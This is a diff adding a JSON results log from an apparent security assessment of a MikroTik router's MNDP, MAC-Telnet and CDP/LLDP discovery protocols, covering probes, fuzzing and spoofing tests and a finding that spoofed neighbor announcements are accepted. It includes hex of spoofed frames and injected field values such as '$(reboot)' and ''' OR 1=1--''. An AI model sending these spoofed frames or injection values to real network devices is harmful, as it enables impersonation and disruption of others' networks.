@@ -1,0 +1,888 @@
+{
+  "metadata": {
+    "script": "attack_discovery.py",
+    "target": "[REDACTED-INTERNAL-IP]",
+    "phase": 6,
+    "start_time": "2026-02-16T00:18:04.730686",
+    "end_time": "2026-02-16T00:20:23.361336",
+    "total_tests": 54,
+    "anomalies": 2,
+    "router_version": "7.20.8 (long-term)",
+    "initial_uptime": "17m4s",
+    "router_log_count": 10,
+    "router_interesting_events": 0,
+    "final_health": {
+      "alive": true,
+      "uptime": "19m22s",
+      "cpu_load": "0",
+      "free_memory": "837550080",
+      "version": "7.20.8 (long-term)"
+    }
+  },
+  "tests": [
+    {
+      "id": 1,
+      "category": "mndp",
+      "name": "MNDP discovery settings",
+      "description": "Query neighbor discovery configuration via REST API",
+      "result": "Settings: {'discover-interface-list': 'static', 'discover-interval': '30s', 'lldp-mac-phy-config': 'false', 'lldp-max-frame-size': 'false', 'lldp-med-net-policy-vlan': 'disabled', 'lldp-vlan-info': 'false', 'mode': 'tx-and-rx', 'protocol': 'cdp,lldp,mndp'}",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:04.734684",
+      "details": {
+        "config": {
+          "discover-interface-list": "static",
+          "discover-interval": "30s",
+          "lldp-mac-phy-config": "false",
+          "lldp-max-frame-size": "false",
+          "lldp-med-net-policy-vlan": "disabled",
+          "lldp-vlan-info": "false",
+          "mode": "tx-and-rx",
+          "protocol": "cdp,lldp,mndp"
+        }
+      }
+    },
+    {
+      "id": 2,
+      "category": "mndp",
+      "name": "Passive MNDP capture",
+      "description": "Listen for MNDP broadcasts",
+      "result": "No MNDP packets received in 10 seconds",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:15.753172"
+    },
+    {
+      "id": 3,
+      "category": "mndp",
+      "name": "Active MNDP probe (unicast)",
+      "description": "Active MNDP discovery request to target",
+      "result": "No response to unicast MNDP probe",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:21.254420"
+    },
+    {
+      "id": 4,
+      "category": "mndp",
+      "name": "Active MNDP probe (broadcast)",
+      "description": "MNDP broadcast probe",
+      "result": "No response to broadcast MNDP probe",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:26.759666"
+    },
+    {
+      "id": 5,
+      "category": "mndp",
+      "name": "MNDP subnet broadcast",
+      "description": "Send MNDP probe to subnet broadcast address ([REDACTED-INTERNAL-IP])",
+      "result": "Received 0 responses",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:31.765162",
+      "details": {
+        "responses": []
+      }
+    },
+    {
+      "id": 6,
+      "category": "mndp",
+      "name": "MNDP disclosure assessment",
+      "description": "Assess MNDP information disclosure",
+      "result": "No MNDP data captured \u2014 cannot assess disclosure",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:31.765162",
+      "details": {
+        "note": "MNDP may be disabled or not reachable"
+      }
+    },
+    {
+      "id": 7,
+      "category": "mndp",
+      "name": "MNDP spoof: Fake router identical identity",
+      "description": "Send spoofed MNDP announcement: Fake router identical identity",
+      "result": "Spoof packet sent (93 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:31.765162",
+      "details": {
+        "description": "Fake router identical identity",
+        "packet_size": 93,
+        "packet_hex": "0000000000010006deadbeefcafe000500084d696b726f54696b0007000f372e32302e382028737461626c6529000800084d696b726f54696b000a000439300000000b0009585858582d58585858000c0003434852001100040a00006f",
+        "params": {
+          "identity": "MikroTik",
+          "version": "7.20.8 (stable)",
+          "platform": "MikroTik",
+          "board": "CHR",
+          "ipv4": "[REDACTED-INTERNAL-IP]"
+        }
+      }
+    },
+    {
+      "id": 8,
+      "category": "mndp",
+      "name": "MNDP spoof: Fake router with admin identity",
+      "description": "Send spoofed MNDP announcement: Fake router with admin identity",
+      "result": "Spoof packet sent (89 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:31.765162",
+      "details": {
+        "description": "Fake router with admin identity",
+        "packet_size": 89,
+        "packet_hex": "0000000000010006deadbeefcafe0005000d41444d494e2d4741544557415900070006372e32302e38000800084d696b726f54696b000a000439300000000b0009585858582d58585858000c0003434852001100040a000001",
+        "params": {
+          "identity": "ADMIN-GATEWAY",
+          "version": "7.20.8",
+          "platform": "MikroTik",
+          "ipv4": "[REDACTED-INTERNAL-IP]"
+        }
+      }
+    },
+    {
+      "id": 9,
+      "category": "mndp",
+      "name": "MNDP spoof: Fake router different platform",
+      "description": "Send spoofed MNDP announcement: Fake router different platform",
+      "result": "Spoof packet sent (86 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:31.765162",
+      "details": {
+        "description": "Fake router different platform",
+        "packet_size": 86,
+        "packet_hex": "0000000000010006deadbeefcafe0005000753504f4f46454400070006362e34392e36000800084d696b726f54696b000a000439300000000b0009585858582d58585858000c0006524234303131001100040a0000c8",
+        "params": {
+          "identity": "SPOOFED",
+          "version": "6.49.6",
+          "platform": "MikroTik",
+          "board": "RB4011",
+          "ipv4": "[REDACTED-INTERNAL-IP]"
+        }
+      }
+    },
+    {
+      "id": 10,
+      "category": "mndp",
+      "name": "MNDP spoof: Fake with long identity (256B)",
+      "description": "Send spoofed MNDP announcement: Fake with long identity (256B)",
+      "result": "Spoof packet sent (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:31.765162",
+      "details": {
+        "description": "Fake with long identity (256B)",
+        "packet_size": 322,
+        "packet_hex": "0000000000010006deadbeefcafe00050100414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141",
+        "params": {
+          "identity": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+          "version": "7.0",
+          "platform": "X",
+          "ipv4": "[REDACTED-INTERNAL-IP]"
+        }
+      }
+    },
+    {
+      "id": 11,
+      "category": "mndp",
+      "name": "MNDP spoof: Fake with special chars",
+      "description": "Send spoofed MNDP announcement: Fake with special chars",
+      "result": "Spoof packet sent (91 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:31.765162",
+      "details": {
+        "description": "Fake with special chars",
+        "packet_size": 91,
+        "packet_hex": "0000000000010006deadbeefcafe0005000a726f757465723b636d640007000924287265626f6f74290008000a27204f5220313d312d2d000a000439300000000b0009585858582d58585858000c0003434852001100040a0000ca",
+        "params": {
+          "identity": "router;cmd",
+          "version": "$(reboot)",
+          "platform": "' OR 1=1--",
+          "ipv4": "[REDACTED-INTERNAL-IP]"
+        }
+      }
+    },
+    {
+      "id": 12,
+      "category": "mndp",
+      "name": "MNDP spoof verification",
+      "description": "Check if spoofed MNDP entries appear in router neighbor table",
+      "result": "Neighbors: 2, Spoofed found: 1",
+      "anomaly": true,
+      "timestamp": "2026-02-16T00:18:33.764162",
+      "details": {
+        "total_neighbors": 2,
+        "spoofed_entries": [
+          {
+            ".id": "*2",
+            "address": "[REDACTED-INTERNAL-IP]",
+            "address4": "[REDACTED-INTERNAL-IP]",
+            "age": "1s",
+            "board": "CHR",
+            "discovered-by": "mndp",
+            "identity": "router;cmd",
+            "interface": "ether1",
+            "mac-address": "08:00:27:6D:41:B2",
+            "platform": "' OR 1=1--",
+            "software-id": "XXXX-XXXX",
+            "system-caps": "",
+            "system-caps-enabled": "",
+            "unpack": "none",
+            "uptime": "3h25m45s",
+            "version": "$(reboot)"
+          }
+        ],
+        "all_neighbors": [
+          {
+            ".id": "*1",
+            "age": "14m18s",
+            "discovered-by": "lldp",
+            "identity": "",
+            "interface": "ether1",
+            "mac-address": "74:56:3C:B5:77:9B",
+            "platform": "",
+            "system-caps": "",
+            "system-caps-enabled": "",
+            "unpack": "none",
+            "version": ""
+          },
+          {
+            ".id": "*2",
+            "address": "[REDACTED-INTERNAL-IP]",
+            "address4": "[REDACTED-INTERNAL-IP]",
+            "age": "1s",
+            "board": "CHR",
+            "discovered-by": "mndp",
+            "identity": "router;cmd",
+            "interface": "ether1",
+            "mac-address": "08:00:27:6D:41:B2",
+            "platform": "' OR 1=1--",
+            "software-id": "XXXX-XXXX",
+            "system-caps": "",
+            "system-caps-enabled": "",
+            "unpack": "none",
+            "uptime": "3h25m45s",
+            "version": "$(reboot)"
+          }
+        ]
+      }
+    },
+    {
+      "id": 13,
+      "category": "mndp",
+      "name": "MNDP fuzz: Empty packet",
+      "description": "Send fuzzed MNDP packet: Empty packet",
+      "result": "No response (expected for malformed)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:35.767160",
+      "details": {
+        "packet_size": 0
+      }
+    },
+    {
+      "id": 14,
+      "category": "mndp",
+      "name": "MNDP fuzz: 1 byte",
+      "description": "Send fuzzed MNDP packet: 1 byte",
+      "result": "No response (expected for malformed)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:37.770158",
+      "details": {
+        "packet_size": 1
+      }
+    },
+    {
+      "id": 15,
+      "category": "mndp",
+      "name": "MNDP fuzz: 3 bytes",
+      "description": "Send fuzzed MNDP packet: 3 bytes",
+      "result": "No response (expected for malformed)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:39.773156",
+      "details": {
+        "packet_size": 3
+      }
+    },
+    {
+      "id": 16,
+      "category": "mndp",
+      "name": "MNDP fuzz: Oversized TLV length",
+      "description": "Send fuzzed MNDP packet: Oversized TLV length",
+      "result": "No response (expected for malformed)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:41.772156",
+      "details": {
+        "packet_size": 108
+      }
+    },
+    {
+      "id": 17,
+      "category": "mndp",
+      "name": "MNDP fuzz: Zero-length TLV",
+      "description": "Send fuzzed MNDP packet: Zero-length TLV",
+      "result": "No response (expected for malformed)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:43.775154",
+      "details": {
+        "packet_size": 8
+      }
+    },
+    {
+      "id": 18,
+      "category": "mndp",
+      "name": "MNDP fuzz: Unknown TLV type 9999",
+      "description": "Send fuzzed MNDP packet: Unknown TLV type 9999",
+      "result": "No response (expected for malformed)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:45.778152",
+      "details": {
+        "packet_size": 12
+      }
+    },
+    {
+      "id": 19,
+      "category": "mndp",
+      "name": "MNDP fuzz: Nested TLVs",
+      "description": "Send fuzzed MNDP packet: Nested TLVs",
+      "result": "No response (expected for malformed)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:49.936072",
+      "details": {
+        "packet_size": 16
+      }
+    },
+    {
+      "id": 20,
+      "category": "mndp",
+      "name": "MNDP fuzz: All 0xFF (100B)",
+      "description": "Send fuzzed MNDP packet: All 0xFF (100B)",
+      "result": "No response (expected for malformed)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:51.939070",
+      "details": {
+        "packet_size": 100
+      }
+    },
+    {
+      "id": 21,
+      "category": "mndp",
+      "name": "MNDP fuzz: Random data (256B)",
+      "description": "Send fuzzed MNDP packet: Random data (256B)",
+      "result": "No response (expected for malformed)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:53.942068",
+      "details": {
+        "packet_size": 256
+      }
+    },
+    {
+      "id": 22,
+      "category": "mndp",
+      "name": "MNDP fuzz: Huge packet (8KB)",
+      "description": "Send fuzzed MNDP packet: Huge packet (8KB)",
+      "result": "No response (expected for malformed)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:55.945066",
+      "details": {
+        "packet_size": 8192
+      }
+    },
+    {
+      "id": 23,
+      "category": "mndp",
+      "name": "MNDP fuzz: TLV chain (50 entries)",
+      "description": "Send fuzzed MNDP packet: TLV chain (50 entries)",
+      "result": "No response (expected for malformed)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:57.952062",
+      "details": {
+        "packet_size": 404
+      }
+    },
+    {
+      "id": 24,
+      "category": "mndp",
+      "name": "MNDP fuzz: Truncated TLV",
+      "description": "Send fuzzed MNDP packet: Truncated TLV",
+      "result": "No response (expected for malformed)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:59.955060",
+      "details": {
+        "packet_size": 13
+      }
+    },
+    {
+      "id": 25,
+      "category": "mndp",
+      "name": "MNDP fingerprinting assessment",
+      "description": "Assess whether MNDP allows unauthenticated router fingerprinting",
+      "result": "MNDP uses UDP 5678, no authentication. Any host on the L2 segment can query and receive full device info.",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:18:59.955060",
+      "details": {
+        "protocol": "MNDP (UDP 5678)",
+        "authentication": "None",
+        "encryption": "None",
+        "risk": "Full device fingerprinting from unauthenticated position"
+      }
+    },
+    {
+      "id": 26,
+      "category": "mndp",
+      "name": "MNDP rate limiting test",
+      "description": "Send 50 rapid MNDP discovery requests to test rate limiting",
+      "result": "Responses: 0/50 in 50.2s",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:19:50.133958",
+      "details": {
+        "requests": 50,
+        "responses": 0,
+        "elapsed": 50.2,
+        "rate_limited": true
+      }
+    },
+    {
+      "id": 27,
+      "category": "mac_telnet",
+      "name": "MAC-Telnet server config",
+      "description": "Query MAC-Telnet server configuration via REST",
+      "result": "Config: {'allowed-interface-list': 'all'}",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:19:50.133958",
+      "details": {
+        "config": {
+          "allowed-interface-list": "all"
+        }
+      }
+    },
+    {
+      "id": 28,
+      "category": "mac_telnet",
+      "name": "MAC-Winbox config",
+      "description": "Query MAC-Winbox server configuration",
+      "result": "Config: {'allowed-interface-list': 'all'}",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:19:50.133958",
+      "details": {
+        "config": {
+          "allowed-interface-list": "all"
+        }
+      }
+    },
+    {
+      "id": 29,
+      "category": "mac_telnet",
+      "name": "MAC-Telnet broadcast probe",
+      "description": "MAC-Telnet discovery broadcast",
+      "result": "No response (service may be disabled or not on same L2 segment)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:19:55.139454"
+    },
+    {
+      "id": 30,
+      "category": "mac_telnet",
+      "name": "MAC-Telnet direct probe",
+      "description": "Direct MAC-Telnet probe",
+      "result": "No response (timeout)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:00.144950"
+    },
+    {
+      "id": 31,
+      "category": "mac_telnet",
+      "name": "mactelnet tool",
+      "description": "Check for mactelnet CLI tool",
+      "result": "mactelnet not installed",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:00.144950"
+    },
+    {
+      "id": 32,
+      "category": "mac_telnet",
+      "name": "MAC-Telnet fuzz: Empty",
+      "description": "Fuzzed MAC-Telnet: Empty",
+      "result": "No response",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:02.147948",
+      "details": {
+        "packet_size": 0
+      }
+    },
+    {
+      "id": 33,
+      "category": "mac_telnet",
+      "name": "MAC-Telnet fuzz: Version 0",
+      "description": "Fuzzed MAC-Telnet: Version 0",
+      "result": "No response",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:04.146948",
+      "details": {
+        "packet_size": 14
+      }
+    },
+    {
+      "id": 34,
+      "category": "mac_telnet",
+      "name": "MAC-Telnet fuzz: Version 255",
+      "description": "Fuzzed MAC-Telnet: Version 255",
+      "result": "No response",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:06.153944",
+      "details": {
+        "packet_size": 14
+      }
+    },
+    {
+      "id": 35,
+      "category": "mac_telnet",
+      "name": "MAC-Telnet fuzz: All types",
+      "description": "Fuzzed MAC-Telnet: All types",
+      "result": "No response",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:08.152944",
+      "details": {
+        "packet_size": 112
+      }
+    },
+    {
+      "id": 36,
+      "category": "mac_telnet",
+      "name": "MAC-Telnet fuzz: Oversized payload (1KB)",
+      "description": "Fuzzed MAC-Telnet: Oversized payload (1KB)",
+      "result": "No response",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:10.155942",
+      "details": {
+        "packet_size": 1024
+      }
+    },
+    {
+      "id": 37,
+      "category": "mac_telnet",
+      "name": "MAC-Telnet fuzz: Random 128B",
+      "description": "Fuzzed MAC-Telnet: Random 128B",
+      "result": "No response",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:12.154942",
+      "details": {
+        "packet_size": 128
+      }
+    },
+    {
+      "id": 38,
+      "category": "mac_telnet",
+      "name": "MAC-Telnet fuzz: All 0xFF (64B)",
+      "description": "Fuzzed MAC-Telnet: All 0xFF (64B)",
+      "result": "No response",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:14.161938",
+      "details": {
+        "packet_size": 64
+      }
+    },
+    {
+      "id": 39,
+      "category": "mac_telnet",
+      "name": "MAC-Telnet fuzz: Valid header + junk",
+      "description": "Fuzzed MAC-Telnet: Valid header + junk",
+      "result": "No response",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:16.160938",
+      "details": {
+        "packet_size": 102
+      }
+    },
+    {
+      "id": 40,
+      "category": "mac_telnet",
+      "name": "MAC-Winbox probe",
+      "description": "MAC-Winbox probe",
+      "result": "No response",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:21.166434"
+    },
+    {
+      "id": 41,
+      "category": "mac_telnet",
+      "name": "MAC-Telnet security assessment",
+      "description": "Assess MAC-Telnet protocol security characteristics",
+      "result": "MAC-Telnet operates at L2 (no IP required), credentials in cleartext, no encryption. Same L2 segment required for exploitation.",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:21.166434",
+      "details": {
+        "protocol": "MAC-Telnet (UDP 20561)",
+        "authentication": "Username/password in cleartext",
+        "encryption": "None",
+        "layer": "Layer 2 (MAC addresses)",
+        "risk": "Credential sniffing, unauthorized access from same L2 segment"
+      }
+    },
+    {
+      "id": 42,
+      "category": "cdp_lldp",
+      "name": "Discovery protocol config",
+      "description": "Query discovery protocol configuration via REST",
+      "result": "Protocol: cdp,lldp,mndp, interfaces: static",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:21.174430",
+      "details": {
+        "config": {
+          "discover-interface-list": "static",
+          "discover-interval": "30s",
+          "lldp-mac-phy-config": "false",
+          "lldp-max-frame-size": "false",
+          "lldp-med-net-policy-vlan": "disabled",
+          "lldp-vlan-info": "false",
+          "mode": "tx-and-rx",
+          "protocol": "cdp,lldp,mndp"
+        }
+      }
+    },
+    {
+      "id": 43,
+      "category": "cdp_lldp",
+      "name": "Passive CDP/LLDP capture",
+      "description": "Listen for CDP/LLDP packets (10 seconds)",
+      "result": "No CDP/LLDP packets captured",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:21.350342",
+      "details": {
+        "note": "CDP/LLDP may be disabled or using different multicast group"
+      }
+    },
+    {
+      "id": 44,
+      "category": "cdp_lldp",
+      "name": "lldpctl tool",
+      "description": "Check for lldpctl tool availability",
+      "result": "lldpctl not installed",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:21.354340"
+    },
+    {
+      "id": 45,
+      "category": "cdp_lldp",
+      "name": "LLDP frame construction",
+      "description": "Build spoofed LLDP frame for injection testing",
+      "result": "Constructed LLDP frame: 83 bytes",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:21.354340",
+      "details": {
+        "frame_hex": "020704deadbeef000104050765746830060200780a1353504f4f4645442d4c4c44502d4445564943450c264d696b726f54696b20526f757465724f5320372e32302e3820434852202d2053504f4f4645440000",
+        "frame_size": 83
+      }
+    },
+    {
+      "id": 46,
+      "category": "cdp_lldp",
+      "name": "LLDP frame injection",
+      "description": "Inject spoofed LLDP frame",
+      "result": "Permission denied \u2014 need root for raw L2 socket",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:21.354340"
+    },
+    {
+      "id": 47,
+      "category": "cdp_lldp",
+      "name": "LLDP injection verification",
+      "description": "Check if spoofed LLDP entry appears in neighbor table",
+      "result": "Total neighbors: 2, spoofed LLDP: 0",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:23.353340",
+      "details": {
+        "total": 2,
+        "spoofed_found": 0,
+        "all_neighbors": [
+          {
+            ".id": "*1",
+            "age": "22s",
+            "discovered-by": "lldp",
+            "identity": "",
+            "interface": "ether1",
+            "mac-address": "74:56:3C:B5:77:9B",
+            "platform": "",
+            "system-caps": "",
+            "system-caps-enabled": "",
+            "unpack": "none",
+            "version": ""
+          },
+          {
+            ".id": "*2",
+            "address": "[REDACTED-INTERNAL-IP]",
+            "address4": "[REDACTED-INTERNAL-IP]",
+            "age": "34s",
+            "board": "CHR",
+            "discovered-by": "mndp",
+            "identity": "router;cmd",
+            "interface": "ether1",
+            "mac-address": "08:00:27:6D:41:B2",
+            "platform": "' OR 1=1--",
+            "software-id": "XXXX-XXXX",
+            "system-caps": "",
+            "system-caps-enabled": "",
+            "unpack": "none",
+            "uptime": "3h25m45s",
+            "version": "$(reboot)"
+          }
+        ]
+      }
+    },
+    {
+      "id": 48,
+      "category": "cdp_lldp",
+      "name": "CDP frame construction",
+      "description": "Build spoofed CDP frame for testing",
+      "result": "CDP frame: 69 bytes",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:23.353340",
+      "details": {
+        "frame_hex": "02b400000001001653504f4f4645442d4344502d524f555445520005001b526f757465724f5320372e32302e382053504f4f464544000600104d696b726f54696b20434852",
+        "frame_size": 69
+      }
+    },
+    {
+      "id": 49,
+      "category": "cdp_lldp",
+      "name": "CDP frame injection",
+      "description": "Inject spoofed CDP frame",
+      "result": "Permission denied \u2014 need root for raw L2 socket",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:23.353340"
+    },
+    {
+      "id": 50,
+      "category": "cdp_lldp",
+      "name": "Neighbor table dump",
+      "description": "Dump complete neighbor discovery table via REST API",
+      "result": "Total neighbors: 2",
+      "anomaly": true,
+      "timestamp": "2026-02-16T00:20:23.357338",
+      "details": {
+        "neighbor_count": 2,
+        "neighbors": [
+          {
+            ".id": "*1",
+            "age": "22s",
+            "discovered-by": "lldp",
+            "identity": "",
+            "interface": "ether1",
+            "mac-address": "74:56:3C:B5:77:9B",
+            "platform": "",
+            "system-caps": "",
+            "system-caps-enabled": "",
+            "unpack": "none",
+            "version": ""
+          },
+          {
+            ".id": "*2",
+            "address": "[REDACTED-INTERNAL-IP]",
+            "address4": "[REDACTED-INTERNAL-IP]",
+            "age": "34s",
+            "board": "CHR",
+            "discovered-by": "mndp",
+            "identity": "router;cmd",
+            "interface": "ether1",
+            "mac-address": "08:00:27:6D:41:B2",
+            "platform": "' OR 1=1--",
+            "software-id": "XXXX-XXXX",
+            "system-caps": "",
+            "system-caps-enabled": "",
+            "unpack": "none",
+            "uptime": "3h25m45s",
+            "version": "$(reboot)"
+          }
+        ]
+      }
+    },
+    {
+      "id": 51,
+      "category": "cdp_lldp",
+      "name": "Neighbor 1 details",
+      "description": "Analyze information disclosed for neighbor 1",
+      "result": "Fields: ['age', 'discovered-by', 'interface', 'mac-address', 'unpack']",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:23.357338",
+      "details": {
+        "neighbor": {
+          "age": "22s",
+          "discovered-by": "lldp",
+          "interface": "ether1",
+          "mac-address": "74:56:3C:B5:77:9B",
+          "unpack": "none"
+        }
+      }
+    },
+    {
+      "id": 52,
+      "category": "cdp_lldp",
+      "name": "Neighbor 2 details",
+      "description": "Analyze information disclosed for neighbor 2",
+      "result": "Fields: ['address', 'address4', 'age', 'board', 'discovered-by', 'identity', 'interface', 'mac-address', 'platform', 'software-id', 'unpack', 'uptime', 'version']",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:23.357338",
+      "details": {
+        "neighbor": {
+          "address": "[REDACTED-INTERNAL-IP]",
+          "address4": "[REDACTED-INTERNAL-IP]",
+          "age": "34s",
+          "board": "CHR",
+          "discovered-by": "mndp",
+          "identity": "router;cmd",
+          "interface": "ether1",
+          "mac-address": "08:00:27:6D:41:B2",
+          "platform": "' OR 1=1--",
+          "software-id": "XXXX-XXXX",
+          "unpack": "none",
+          "uptime": "3h25m45s",
+          "version": "$(reboot)"
+        }
+      }
+    },
+    {
+      "id": 53,
+      "category": "cdp_lldp",
+      "name": "Discovery protocol security summary",
+      "description": "Overall security assessment of discovery protocols",
+      "result": "MNDP/CDP/LLDP are unauthenticated L2/L3 protocols. They disclose device identity, version, platform, and addresses to any host that can receive the frames.",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:23.357338",
+      "details": {
+        "protocols_assessed": [
+          "MNDP",
+          "CDP",
+          "LLDP"
+        ],
+        "common_risks": [
+          "Information disclosure (device type, version, addresses)",
+          "Spoofing (inject fake neighbor entries)",
+          "Reconnaissance (map network topology without authentication)",
+          "No encryption or authentication on any protocol"
+        ]
+      }
+    },
+    {
+      "id": 54,
+      "category": "cdp_lldp",
+      "name": "Active discovery protocols",
+      "description": "Identify which discovery protocols are actively configured",
+      "result": "Configured protocol(s): cdp,lldp,mndp",
+      "anomaly": false,
+      "timestamp": "2026-02-16T00:20:23.361336",
+      "details": {
+        "protocol": "cdp,lldp,mndp",
+        "full_config": {
+          "discover-interface-list": "static",
+          "discover-interval": "30s",
+          "lldp-mac-phy-config": "false",
+          "lldp-max-frame-size": "false",
+          "lldp-med-net-policy-vlan": "disabled",
+          "lldp-vlan-info": "false",
+          "mode": "tx-and-rx",
+          "protocol": "cdp,lldp,mndp"
+        }
+      }
+    }
+  ],
+  "findings": [
+    {
+      "id": 1,
+      "severity": "MEDIUM",
+      "title": "MNDP spoofing accepted",
+      "description": "Spoofed MNDP announcements were accepted into neighbor table. Attacker can impersonate routers on the network.",
+      "timestamp": "2026-02-16T00:18:33.764162",
+      "cwe": "CWE-290"
+    }
+  ]
+}
